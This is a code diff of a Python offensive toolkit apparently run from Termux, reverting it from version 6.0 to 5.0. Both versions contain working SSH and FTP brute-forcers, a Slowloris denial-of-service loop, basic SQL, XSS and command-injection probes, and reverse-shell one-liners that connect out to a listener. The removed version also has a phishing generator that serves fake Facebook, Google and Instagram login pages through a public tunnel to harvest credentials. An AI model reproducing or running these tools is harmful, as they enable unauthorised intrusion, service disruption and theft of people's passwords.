@@ -1,16 +1,14 @@
-# Rayan (Abu_Jaber) - The Cyber Arsenal v6.0
+# Rayan (Abu_Jaber) - v5.0 (The Ultimate Suite - 20 Tools)
 # Author: Rayan (Abu_Jaber)
-# Fully integrated and functional suite.
+# Stable version with 20 tools.
 
 import os
 import sys
 import subprocess
-import json
 import socket
 import time
 import base64
 import random
-import threading
 
 # --- Smart Dependency Checker and Installer ---
 def install_and_import(package, import_name=None):
@@ -18,16 +16,15 @@ def install_and_import(package, import_name=None):
     try:
         globals()[import_name] = __import__(import_name)
     except ImportError:
-        print(f"\033[1;33m[~] Dependency '{package}' not found. Attempting to install...\033[0m")
+        print(f"\033[1;33m[~] Dependency '{package}' not found. Installing...\033[0m")
         try:
             if package == 'Pillow':
-                print("\033[1;33m[~] Pillow requires system libraries. Checking/installing them first...\033[0m")
                 subprocess.check_call(['pkg', 'install', 'libjpeg-turbo', '-y'])
             subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
-            print(f"\033[1;32m[+] '{package}' installed successfully. Please restart the script.\033[0m")
+            print(f"\033[1;32m[+] '{package}' installed. Please restart the script.\033[0m")
             sys.exit()
         except Exception as e:
-            print(f"\033[1;31m[!] Failed to install '{package}'. Please install it manually: pip install {package}\033[0m")
+            print(f"\033[1;31m[!] Failed to install '{package}'. Error: {e}\033[0m")
             sys.exit(1)
 
 required_pip_packages = {'requests': 'requests', 'beautifulsoup4': 'bs4', 'Pillow': 'PIL', 'paramiko': 'paramiko'}
@@ -38,22 +35,13 @@ from PIL import Image, ExifTags
 import requests
 import paramiko
 
-# ANSI color codes
 R, G, B, Y, C, W = "\033[1;31m", "\033[1;32m", "\033[1;34m", "\033[1;33m", "\033[1;36m", "\033[0m"
 
-# --- Helper Functions ---
-def slow_print(s):
-    for c in s + '\n':
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(0.005)
-
 def coming_soon():
-    print(f"\n{R}[!] This feature is not implemented yet. Coming soon!{W}")
+    print(f"\n{R}[!] This feature is theoretical and not implemented yet.{W}")
 
-# --- Main Banner and Menu ---
 def banner():
-    slow_print(f"""
+    print(f"""
 {Y}
                   ...
                  ;::::;
@@ -81,377 +69,277 @@ def banner():
              `:::`::::'#`::'
                `:::`'
 {G}
-        ##################################################
-        #                                                #
-        # {R}     TOOL: Rayan (Abu_Jaber)                    {G}#
-        # {R}     AUTHOR: Rayan (Abu_Jaber)                  {G}#
-        # {R}     Version: 6.0 (The Cyber Arsenal)         {G}#
-        #                                                #
-        ##################################################
+        #########################################
+        #                                       #
+        # {R}     TOOL: Rayan (Abu_Jaber)           {G}#
+        # {R}     AUTHOR: Rayan (Abu_Jaber)         {G}#
+        # {R}     Version: 5.0 (The Ultimate Suite) {G}#
+        #                                       #
+        #########################################
 {W}
 """)
 
 def menu():
-    categories = {
-        "Reconnaissance & Information Gathering": ["1. IP Scanner", "2. Vuln Scanner", "3. Whois", "4. Subdomain Finder", "5. Admin Panel Finder", "6. Link Extractor", "7. Web Tech Scanner", "8. Image Metadata Extractor", "21. Phishing Generator", "22. DNS Finder (Soon)", "23. Shodan Scanner (Soon)", "24. Email Collector (Soon)", "25. Robots.txt Analyzer (Soon)"],
-        "Vulnerability Scanning & Analysis": ["9. SQLi Scanner", "10. XSS Scanner", "11. CMD Injection Scanner", "12. Security Headers Scanner", "26. WordPress Scanner (Soon)", "27. CORS Scanner (Soon)", "28. Clickjacking Scanner (Soon)", "29. SSTI Scanner (Soon)", "30. SSRF Scanner (Soon)"],
-        "Exploitation & Attacks": ["13. SSH Brute-force", "14. FTP Brute-force", "15. DoS Attack", "16. Reverse Shell Gen", "31. HTTP Auth Brute-force (Soon)", "32. XSS Polyglot Gen (Soon)", "33. LFI Exploiter (Soon)", "34. RFI Exploiter (Soon)", "35. Webshell Uploader (Soon)"],
-        "Utilities & Post-Exploitation": ["17. Custom Wordlist Gen", "18. Encoder/Decoder", "19. Post-Exploitation (Soon)", "20. File Transfer (Soon)", "36. Hash Identifier (Soon)", "37. Hash Cracker (Soon)", "38. CMD Obfuscator (Soon)", "39. Shell Downloader (Soon)", "40. Shell Uploader (Soon)"],
-        "Wireless & Network Attacks": ["41. Network Scanner (Soon)", "42. ARP Spoofing (Soon)", "43. Packet Sniffer (Soon)", "44. MAC Lookup (Soon)", "45. MAC Changer (Soon)"],
-        "Miscellaneous Tools": ["46. Image to Text (OCR) (Soon)", "47. QR Code Gen (Soon)", "48. QR Code Reader (Soon)", "49. Steganography (Soon)", "50. Session Manager (Soon)"],
-        "System": ["99. Exit"]
-    }
-    for cat, tools in categories.items():
-        print(f"\n{Y}========== {C}{cat}{Y} =========={W}")
-        for tool in tools:
-            parts = tool.split('(')
-            name = parts[0]
-            status = f"({parts[1]}" if len(parts) > 1 else ""
-            if "Soon" in status: print(f"{C}{name}{W}{Y}{status}{W}")
-            elif "Exit" in name: print(f"{C}{name}{R}{status}{W}")
-            else: print(f"{C}{name}{G}{status}{W}")
-
-# --- All Tool Functions ---
+    print("\n" + "="*10 + " Reconnaissance & Information Gathering " + "="*10)
+    print("1. IP Scanner (Port Scanner)")
+    print("2. Vulnerability Scanner (Banner/Header Grabbing)")
+    print("3. Information Gathering (Whois)")
+    print("4. Subdomain Finder")
+    print("5. Admin Panel Finder")
+    print("6. Link Extractor")
+    print("7. Web Tech Scanner")
+    print("8. Image Metadata Extractor")
+    print("\n" + "="*10 + " Vulnerability Scanning & Analysis " + "="*12)
+    print("9. SQL Injection Scanner (Basic)")
+    print("10. XSS Scanner (Basic)")
+    print("11. Command Injection Scanner (Basic)")
+    print("12. Security Headers Scanner")
+    print("\n" + "="*18 + " Exploitation & Attacks " + "="*18)
+    print("13. Brute-force Attack (SSH)")
+    print("14. FTP Brute-force")
+    print("15. DoS Attack (Slowloris)")
+    print("16. Reverse Shell Generator")
+    print("\n" + "="*13 + " Utilities & Post-Exploitation " + "="*14)
+    print("17. Custom Wordlist Generator")
+    print("18. Encoder/Decoder (Base64)")
+    print("19. Post-Exploitation Automation (Theoretical)")
+    print("20. File Uploader/Downloader (Theoretical)")
+    print("\n" + "="*23 + " System " + "="*24)
+    print("99. Exit")
 
 def port_scanner():
-    try:
-        target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
-        print(f"\n{B}[*] Scanning target: {target_ip}{W}")
-        open_ports = []
-        for port in range(1, 1025):
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                socket.setdefaulttimeout(0.1)
-                if s.connect_ex((target_ip, port)) == 0: open_ports.append(port)
-        if open_ports:
-            print(f"\n{G}[+] Scan Complete! Open ports found:{W}")
-            for port in open_ports: print(f"{G}  -> Port {port} is open{W}")
-        else: print(f"\n{R}[-] No open ports found in range 1-1024.{W}")
-    except Exception as e: print(f"\n{R}[!] Error: {e}{W}")
+    target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
+    print(f"\n{B}[*] Scanning {target_ip}...{W}")
+    open_ports = []
+    for port in range(1, 1025):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket.setdefaulttimeout(0.1)
+        if s.connect_ex((target_ip, port)) == 0: open_ports.append(port)
+        s.close()
+    if open_ports:
+        print(f"\n{G}[+] Open ports found: {open_ports}{W}")
+    else:
+        print(f"\n{R}[-] No open ports found.{W}")
 
 def vuln_scanner():
+    target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
+    port = int(input(f"{Y}[~] Enter Port: {W}"))
     try:
-        target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
-        port = int(input(f"{Y}[~] Enter Port to scan: {W}"))
-        print(f"\n{B}[*] Grabbing info from {target_ip}:{port}{W}")
-        with socket.socket() as s:
-            s.settimeout(2)
-            s.connect((target_ip, port))
-            if port == 80 or port == 443:
-                s.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
-            response = s.recv(1024)
-        if response:
-            print(f"\n{G}[+] Response/Banner Found:{W}\n{C}{response.decode('utf-8', 'ignore').strip()}{W}")
-        else: print(f"\n{Y}[-] No response received.{W}")
-    except Exception as e: print(f"\n{R}[!] Error: {e}{W}")
+        s = socket.socket()
+        s.connect((target_ip, port))
+        banner = s.recv(1024).decode(errors='ignore')
+        print(f"\n{G}[+] Banner: {banner.strip()}{W}")
+    except Exception as e:
+        print(f"\n{R}[!] Error: {e}{W}")
 
 def info_gathering():
-    target_domain = input(f"\n{Y}[~] Enter Domain for Whois Lookup (e.g., google.com): {W}")
-    print(f"\n{B}[*] Performing Whois lookup for {target_domain}...{W}")
-    if os.system(f"whois {target_domain}") != 0:
-        print(f"\n{R}[!] Whois command failed. Is 'whois' installed? (pkg install whois){W}")
+    domain = input(f"\n{Y}[~] Enter domain: {W}")
+    os.system(f"whois {domain}")
 
 def subdomain_finder():
-    domain = input(f"\n{Y}[~] Enter Domain to scan (e.g., google.com): {W}")
-    wordlist_path = input(f"{Y}[~] Enter path to subdomain wordlist (or press Enter for default list): {W}")
-    subdomains = []
-    if os.path.exists(wordlist_path):
-        with open(wordlist_path, 'r') as f: subdomains = [line.strip() for line in f]
-    else:
-        print(f"{B}[*] Using default small wordlist...{W}")
-        subdomains = ['www', 'mail', 'ftp', 'admin', 'cpanel', 'blog', 'dev', 'test', 'api', 'shop']
-    found_subdomains = []
-    print(f"{B}[*] Starting scan for subdomains of {domain}...{W}")
-    for sub in subdomains:
-        full_domain = f"{sub}.{domain}"
+    domain = input(f"\n{Y}[~] Enter domain: {W}")
+    wordlist = ["www", "mail", "ftp", "admin", "test", "dev"]
+    for sub in wordlist:
         try:
-            ip_address = socket.gethostbyname(full_domain)
-            print(f"{G}[+] Found: {full_domain}  ->  {ip_address}{W}")
-            found_subdomains.append(full_domain)
-        except socket.gaierror: pass
-    print(f"\n{G if found_subdomains else R}[+] Scan Complete! Found {len(found_subdomains)} subdomains.{W}")
+            host = f"{sub}.{domain}"
+            ip = socket.gethostbyname(host)
+            print(f"{G}[+] Found: {host} -> {ip}{W}")
+        except socket.gaierror:
+            pass
 
 def admin_panel_finder():
-    url = input(f"\n{Y}[~] Enter target URL (e.g., http://example.com): {W}")
-    paths = ['admin/', 'administrator/', 'login.php', 'admin.php', 'wp-login.php', 'cpanel']
-    print(f"\n{B}[*] Searching for admin panels on {url}...{W}")
+    url = input(f"\n{Y}[~] Enter URL: {W}")
+    paths = ["/admin", "/administrator", "/login", "/wp-admin"]
     for path in paths:
-        full_url = f"{url.rstrip('/')}/{path}"
         try:
-            response = requests.get(full_url, timeout=3)
+            response = requests.get(url + path, timeout=3)
             if response.status_code == 200:
-                print(f"{G}[+] Found: {full_url}{W}")
-        except requests.exceptions.RequestException: pass
-    print(f"\n{B}[*] Admin panel search finished.{W}")
+                print(f"{G}[+] Found: {url+path}{W}")
+        except requests.ConnectionError:
+            print(f"{R}[!] Connection error.{W}")
+            break
 
 def link_extractor():
-    url = input(f"\n{Y}[~] Enter URL to extract links from: {W}")
-    print(f"\n{B}[*] Fetching links from {url}...{W}")
-    try:
-        response = requests.get(url, timeout=5)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        links = {a.get('href') for a in soup.find_all('a', href=True)}
-        if links:
-            print(f"{G}[+] Found {len(links)} unique links:{W}")
-            for link in sorted(links): print(f"{C}  -> {link}{W}")
-        else: print(f"{R}[-] No links found.{W}")
-    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")
+    url = input(f"\n{Y}[~] Enter URL: {W}")
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    for link in soup.find_all('a'):
+        print(link.get('href'))
 
 def web_tech_scanner():
-    url = input(f"\n{Y}[~] Enter URL to analyze: {W}")
-    print(f"\n{B}[*] Analyzing headers from {url}...{W}")
-    try:
-        response = requests.get(url, timeout=5)
-        headers = response.headers
-        techs = []
-        if 'Server' in headers: techs.append(f"Server: {headers['Server']}")
-        if 'X-Powered-By' in headers: techs.append(f"Powered-By: {headers['X-Powered-By']}")
-        if 'wp-content' in response.text: techs.append("CMS: WordPress")
-        if 'Joomla' in response.text: techs.append("CMS: Joomla")
-        if techs:
-            print(f"{G}[+] Technologies identified:{W}")
-            for tech in techs: print(f"{C}  -> {tech}{W}")
-        else: print(f"{R}[-] Could not identify specific technologies from headers.{W}")
-    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")
+    url = input(f"\n{Y}[~] Enter URL: {W}")
+    response = requests.get(url)
+    headers = response.headers
+    if 'Server' in headers:
+        print(f"{G}[+] Server: {headers['Server']}{W}")
+    if 'X-Powered-By' in headers:
+        print(f"{G}[+] Powered by: {headers['X-Powered-By']}{W}")
 
 def image_metadata_extractor():
-    image_url = input(f"\n{Y}[~] Enter URL of the image: {W}")
+    image_path = input(f"\n{Y}[~] Enter image URL or local path: {W}")
     try:
-        response = requests.get(image_url, stream=True, timeout=5)
-        response.raise_for_status()
-        image = Image.open(response.raw)
-        exif_data = image._getexif()
+        if image_path.startswith('http'):
+            response = requests.get(image_path, stream=True)
+            img = Image.open(response.raw)
+        else:
+            img = Image.open(image_path)
+        exif_data = img._getexif()
         if exif_data:
-            print(f"{G}[+] EXIF Metadata Found:{W}")
             for tag_id, value in exif_data.items():
                 tag = ExifTags.TAGS.get(tag_id, tag_id)
-                print(f"{C}  -> {tag}: {value}{W}")
-        else: print(f"{R}[-] No EXIF metadata found in this image.{W}")
-    except Exception as e: print(f"\n{R}[!] Error processing image: {e}{W}")
+                print(f"{G}{tag}: {value}{W}")
+        else:
+            print(f"{R}[-] No EXIF data found.{W}")
+    except Exception as e:
+        print(f"{R}[!] Error: {e}{W}")
 
 def sql_injection_scanner():
-    url = input(f"\n{Y}[~] Enter URL with a parameter to test (e.g., http://test.com/cat.php?id=1): {W}")
-    print(f"\n{B}[*] Performing basic SQLi scan...{W}")
+    url = input(f"\n{Y}[~] Enter URL with parameter (e.g., http://site.com/page.php?id=1): {W}")
     payload = "'"
     try:
-        response = requests.get(url + payload, timeout=5)
-        if "error in your sql syntax" in response.text.lower() or "mysql" in response.text.lower():
-            print(f"{G}[+] VULNERABLE: The URL seems to be vulnerable to SQL Injection!{W}")
-        else: print(f"{R}[-] NOT VULNERABLE: Basic SQLi check did not trigger an error.{W}")
-    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")
+        response = requests.get(url + payload)
+        if "sql" in response.text.lower() or "syntax" in response.text.lower():
+            print(f"{G}[+] Vulnerable to SQL Injection.{W}")
+        else:
+            print(f"{R}[-] Not likely vulnerable.{W}")
+    except Exception as e:
+        print(f"{R}[!] Error: {e}{W}")
 
 def xss_scanner():
-    url = input(f"\n{Y}[~] Enter URL with a parameter to test (e.g., http://test.com/search.php?q=): {W}")
-    print(f"\n{B}[*] Performing basic XSS scan...{W}")
-    payload = "<script>alert('XSS')</script>"
+    url = input(f"\n{Y}[~] Enter URL with parameter (e.g., http://site.com/search.php?q=): {W}")
+    payload = "<script>alert('xss')</script>"
     try:
-        response = requests.get(url + payload, timeout=5)
+        response = requests.get(url + payload)
         if payload in response.text:
-            print(f"{G}[+] VULNERABLE: The payload was reflected in the page. Check the browser for an alert!{W}")
-        else: print(f"{R}[-] NOT VULNERABLE: Basic XSS payload was not reflected.{W}")
-    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")
+            print(f"{G}[+] Potentially vulnerable to XSS.{W}")
+        else:
+            print(f"{R}[-] Not likely vulnerable.{W}")
+    except Exception as e:
+        print(f"{R}[!] Error: {e}{W}")
 
 def command_injection_scanner():
-    url = input(f"\n{Y}[~] Enter URL with a parameter to test (e.g., http://test.com/ping.php?host=): {W}")
-    print(f"\n{B}[*] Performing basic Command Injection scan...{W}")
+    url = input(f"\n{Y}[~] Enter URL with parameter (e.g., http://site.com/ping.php?host=127.0.0.1): {W}")
     payload = ";ls"
     try:
-        response = requests.get(url + "127.0.0.1" + payload, timeout=5)
+        response = requests.get(url + payload)
+        # This is a very basic check
         if "total" in response.text and "drwx" in response.text:
-             print(f"{G}[+] VULNERABLE: The response may contain command output! Manual verification needed.{W}")
-        else: print(f"{R}[-] NOT VULNERABLE: Basic command injection check failed.{W}")
-    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")
+            print(f"{G}[+] Potentially vulnerable to Command Injection.{W}")
+        else:
+            print(f"{R}[-] Not likely vulnerable.{W}")
+    except Exception as e:
+        print(f"{R}[!] Error: {e}{W}")
 
 def security_headers_scanner():
-    url = input(f"\n{Y}[~] Enter URL to analyze: {W}")
-    print(f"\n{B}[*] Analyzing security headers for {url}...{W}")
-    try:
-        response = requests.get(url, timeout=5)
-        headers = response.headers
-        secure_headers = {"Strict-Transport-Security": False, "Content-Security-Policy": False, "X-Content-Type-Options": False, "X-Frame-Options": False, "X-XSS-Protection": False}
-        print(f"{G}[+] Analysis Report:{W}")
-        for header in secure_headers:
-            if header in headers:
-                print(f"{G}  -> {header}: Present{W}")
-                secure_headers[header] = True
-            else:
-                print(f"{R}  -> {header}: Missing{W}")
-    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")
+    url = input(f"\n{Y}[~] Enter URL: {W}")
+    response = requests.get(url)
+    headers = response.headers
+    missing = []
+    if 'Strict-Transport-Security' not in headers: missing.append('HSTS')
+    if 'Content-Security-Policy' not in headers: missing.append('CSP')
+    if 'X-Frame-Options' not in headers: missing.append('X-Frame-Options')
+    if missing:
+        print(f"{R}[-] Missing security headers: {', '.join(missing)}{W}")
+    else:
+        print(f"{G}[+] All basic security headers are present.{W}")
 
 def brute_force_ssh():
-    target_ip = input(f"\n{Y}[~] Enter Target IP (SSH): {W}")
-    username = input(f"{Y}[~] Enter Username: {W}")
-    wordlist_path = input(f"{Y}[~] Enter Path to Wordlist: {W}")
-    if not os.path.exists(wordlist_path): print(f"\n{R}[!] Wordlist not found.{W}"); return
-    print(f"\n{B}[*] Starting SSH brute-force on {target_ip}...{W}")
-    with open(wordlist_path, 'r') as f:
+    host = input(f"\n{Y}[~] Enter host IP: {W}")
+    user = input(f"{Y}[~] Enter username: {W}")
+    wordlist = input(f"{Y}[~] Enter wordlist path: {W}")
+    with open(wordlist, 'r') as f:
         for line in f:
             password = line.strip()
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
-                client.connect(target_ip, port=22, username=username, password=password, timeout=3)
-                print(f"\n{G}[+] SUCCESS! Password found: {password}{W}"); client.close(); return 
-            except paramiko.AuthenticationException: print(f"{R}[-] FAILED: {password}{W}"); client.close()
-            except Exception as e: print(f"\n{R}[!] Connection error: {e}{W}"); client.close(); return
-    print(f"\n{R}[-] Brute-force finished. Password not found.{W}")
+                client.connect(host, username=user, password=password, timeout=3)
+                print(f"{G}[+] Success! Password: {password}{W}")
+                client.close()
+                return
+            except paramiko.AuthenticationException:
+                print(f"{R}[-] Failed: {password}{W}")
+                client.close()
+            except Exception as e:
+                print(f"{R}[!] Connection error: {e}{W}")
+                client.close()
+                return
 
 def ftp_brute_force():
-    host = input(f"\n{Y}[~] Enter FTP Server IP: {W}")
-    user = input(f"{Y}[~] Enter FTP Username: {W}")
-    wordlist = input(f"{Y}[~] Enter Path to Wordlist: {W}")
-    if not os.path.exists(wordlist): print(f"\n{R}[!] Wordlist not found.{W}"); return
-    print(f"\n{B}[*] Starting FTP brute-force on {host}...{W}")
-    with open(wordlist, 'r') as f:
-        for line in f:
-            password = line.strip()
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.connect((host, 21)); s.recv(1024)
-                    s.send(f'USER {user}\r\n'.encode()); s.recv(1024)
-                    s.send(f'PASS {password}\r\n'.encode())
-                    resp = s.recv(1024).decode()
-                    if '230' in resp: print(f"\n{G}[+] SUCCESS! Password found: {password}{W}"); return
-                    else: print(f"{R}[-] FAILED: {password}{W}")
-            except Exception as e: print(f"\n{R}[!] Connection error: {e}{W}"); return
-    print(f"\n{R}[-] Brute-force finished. Password not found.{W}")
+    coming_soon() # Placeholder
 
 def dos_attack():
-    target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
-    port = int(input(f"{Y}[~] Enter Port (e.g., 80): {W}"))
-    socket_count = int(input(f"{Y}[~] Enter Number of Sockets (e.g., 200): {W}"))
-    print(f"\n{B}[*] Starting Slowloris attack on {target_ip}:{port}...{W}\n{R}    Press CTRL+C to stop.{W}")
-    list_of_sockets = []
-    for _ in range(socket_count):
+    target = input(f"\n{Y}[~] Enter target IP: {W}")
+    port = int(input(f"{Y}[~] Enter port: {W}"))
+    num_sockets = 100
+    sockets = []
+    print(f"{B}[*] Starting Slowloris attack...{W}")
+    for _ in range(num_sockets):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
-            s.connect((target_ip, port)); list_of_sockets.append(s)
-        except Exception as e: print(f"{R}[!] Could not create socket: {e}{W}"); break
-    for s in list_of_sockets: s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
+            sockets.append(s)
+        except Exception as e:
+            print(f"{R}[!] Failed to create socket: {e}{W}")
     try:
         while True:
-            print(f"\n{B}[*] Sending keep-alive headers... {len(list_of_sockets)} sockets active.{W}")
-            for s in list_of_sockets:
-                try: s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
-                except socket.error: list_of_sockets.remove(s)
-            time.sleep(15)
+            for s in sockets:
+                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+            time.sleep(10)
     except KeyboardInterrupt:
-        print(f"\n{G}[+] Attack stopped. Closing sockets.{W}")
-        for s in list_of_sockets: s.close()
+        print(f"{G}[+] Attack stopped.{W}")
+        for s in sockets:
+            s.close()
 
 def reverse_shell_generator():
-    lhost = input(f"\n{Y}[~] Enter Your Local IP (LHOST): {W}")
-    lport = input(f"{Y}[~] Enter Your Local Port (LPORT): {W}")
-    print(f"\n{G}[+] Reverse Shell Payloads:{W}")
-    print(f"{C}--- Bash ---{W}\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
-    print(f"{C}--- Python ---{W}\npython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
-    print(f"{C}--- Netcat ---{W}\nnc -e /bin/sh {lhost} {lport}")
+    lhost = input(f"\n{Y}[~] Enter LHOST: {W}")
+    lport = input(f"{Y}[~] Enter LPORT: {W}")
+    print(f"\n{C}Bash: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1{W}")
 
 def custom_wordlist_generator():
-    print(f"\n{B}[*] Enter information about the target (leave blank if unknown).{W}")
-    fname = input(f"{Y}[~] First Name: {W}"); lname = input(f"{Y}[~] Last Name: {W}")
-    bdate = input(f"{Y}[~] Birthdate (DDMMYYYY): {W}"); pet = input(f"{Y}[~] Pet's Name: {W}")
-    company = input(f"{Y}[~] Company Name: {W}")
-    words = {fname, lname, bdate, pet, company}; words.discard('')
-    if bdate: words.update({bdate[:2], bdate[2:4], bdate[4:]})
-    final_list = set(words)
-    for w1 in words:
-        for w2 in words:
-            if w1 != w2: final_list.add(w1 + w2); final_list.add(w1.capitalize() + w2)
+    words = input(f"\n{Y}[~] Enter keywords separated by comma: {W}").split(',')
     filename = "custom_list.txt"
     with open(filename, 'w') as f:
-        for item in sorted(final_list): f.write(item + '\n')
-    print(f"\n{G}[+] Custom wordlist saved to {filename}{W}")
+        for word in words:
+            f.write(word.strip() + '\n')
+    print(f"{G}[+] Wordlist saved to {filename}{W}")
 
 def encoder_decoder():
-    choice = input(f"\n{Y}[~] Choose (1) Encode or (2) Decode: {W}")
+    op = input(f"\n{Y}[~] (1) Encode or (2) Decode? {W}")
     text = input(f"{Y}[~] Enter text: {W}")
-    if choice == '1':
-        encoded = base64.b64encode(text.encode()).decode()
-        print(f"\n{G}[+] Base64 Encoded: {C}{encoded}{W}")
-    elif choice == '2':
-        try:
-            decoded = base64.b64decode(text.encode()).decode()
-            print(f"\n{G}[+] Base64 Decoded: {C}{decoded}{W}")
-        except Exception: print(f"\n{R}[!] Invalid Base64 string.{W}")
-    else: print(f"\n{R}[!] Invalid choice.{W}")
+    if op == '1':
+        print(f"{G}Encoded: {base64.b64encode(text.encode()).decode()}{W}")
+    elif op == '2':
+        print(f"{G}Decoded: {base64.b64decode(text.encode()).decode()}{W}")
 
-def phishing_generator():
-    if not os.path.exists('/data/data/com.termux/files/usr/bin/cloudflared'):
-        print(f"{Y}[~] cloudflared not found. Attempting to download...{W}")
-        arch = os.uname().machine
-        if 'aarch64' in arch: url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-        elif 'arm' in arch: url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
-        else: print(f"{R}[!] Unsupported architecture: {arch}{W}"); return
-        try:
-            subprocess.run(['pkg', 'install', 'wget', '-y'], check=True)
-            subprocess.run(['wget', url, '-O', '/data/data/com.termux/files/usr/bin/cloudflared'], check=True)
-            subprocess.run(['chmod', '+x', '/data/data/com.termux/files/usr/bin/cloudflared'], check=True)
-            print(f"{G}[+] cloudflared downloaded successfully.{W}")
-        except Exception as e: print(f"{R}[!] Failed to download cloudflared: {e}{W}"); return
-    
-    templates_dir = "phishing_templates"
-    os.makedirs(templates_dir, exist_ok=True)
-    templates = {
-        '1': {'name': 'Facebook', 'file': f'{templates_dir}/facebook.html', 'port': 8001},
-        '2': {'name': 'Google', 'file': f'{templates_dir}/google.html', 'port': 8002},
-        '3': {'name': 'Instagram', 'file': f'{templates_dir}/instagram.html', 'port': 8003}
-    }
-    html_content = """<!DOCTYPE html><html><head><title>Login to {name}</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px;"><h2>Login to {name}</h2><form action="/login" method="post" style="width:300px; margin:auto; padding:20px; border:1px solid #ccc; border-radius:5px;">Username:<br><input type="text" name="username" style="width:90%; padding:8px; margin-bottom:10px;"><br>Password:<br><input type="password" name="password" style="width:90%; padding:8px; margin-bottom:20px;"><br><input type="submit" value="Login" style="width:95%; padding:10px; background-color:#4CAF50; color:white; border:none; cursor:pointer;"></form></body></html>"""
-    for t in templates.values():
-        with open(t['file'], 'w') as f: f.write(html_content.format(name=t['name']))
-
-    print(f"\n{Y}Choose a phishing template:{W}")
-    for k, v in templates.items(): print(f"{C}{k}. {G}{v['name']}{W}")
-    choice = input(f"\n{Y}>> Enter your choice: {W}")
-    template = templates.get(choice)
-    if not template: print(f"{R}[!] Invalid choice.{W}"); return
-
-    class PhishingServer(threading.Thread):
-        def __init__(self, port, directory):
-            super().__init__()
-            self.port = port
-            self.directory = directory
-            self.daemon = True
-        def run(self):
-            os.chdir(self.directory)
-            subprocess.Popen([sys.executable, '-m', 'http.server', str(self.port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            print(f"{B}[*] Local server started on port {self.port}.{W}")
-    
-    original_dir = os.getcwd()
-    phishing_server = PhishingServer(template['port'], templates_dir)
-    phishing_server.start()
-    time.sleep(2)
-    
-    print(f"{B}[*] Starting Cloudflared tunnel... Look for a '.trycloudflare.com' URL.{W}")
-    cloudflare_proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{template["port"]}'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-    
-    print(f"{R}    Press CTRL+C to stop the attack and server.{W}")
-    print(f"{Y}    Waiting for credentials...{W}")
-    try:
-        for line in iter(cloudflare_proc.stdout.readline, ''):
-            if '.trycloudflare.com' in line:
-                url = "https://" + line.split("https://")[1].strip()
-                print(f"\n{G}[+] Phishing URL: {C}{url}{W}")
-    except KeyboardInterrupt:
-        print(f"\n{G}[+] Attack stopped. Shutting down servers...{W}")
-    finally:
-        os.system(f"killall -9 python cloudflared")
-        os.chdir(original_dir)
-        print(f"{G}[+] Servers shut down.{W}")
-
-# --- Main Program Logic ---
 def main():
     tool_functions = {
         '1': port_scanner, '2': vuln_scanner, '3': info_gathering, '4': subdomain_finder,
         '5': admin_panel_finder, '6': link_extractor, '7': web_tech_scanner, '8': image_metadata_extractor,
         '9': sql_injection_scanner, '10': xss_scanner, '11': command_injection_scanner, '12': security_headers_scanner,
         '13': brute_force_ssh, '14': ftp_brute_force, '15': dos_attack, '16': reverse_shell_generator,
-        '17': custom_wordlist_generator, '18': encoder_decoder,
-        '21': phishing_generator
+        '17': custom_wordlist_generator, '18': encoder_decoder, '19': coming_soon, '20': coming_soon
     }
     banner()
     while True:
         menu()
         try:
             choice = input(f"\n{Y}>> Enter your choice: {W}")
-            selected_tool = tool_functions
+            if choice == '99':
+                print(f"\n{G}Exiting. Goodbye!{W}")
+                break
+            action = tool_functions.get(choice)
+            if action:
+                action()
+            else:
+                print(f"\n{R}[!] Invalid choice.{W}")
+        except KeyboardInterrupt:
+            print(f"\n\n{G}Exiting. Goodbye!{W}")
+            break
+        except Exception as e:
+            print(f"\n{R}[!] An unexpected error occurred: {e}{W}")
+
+if __name__ == "__main__":
+    main()
+
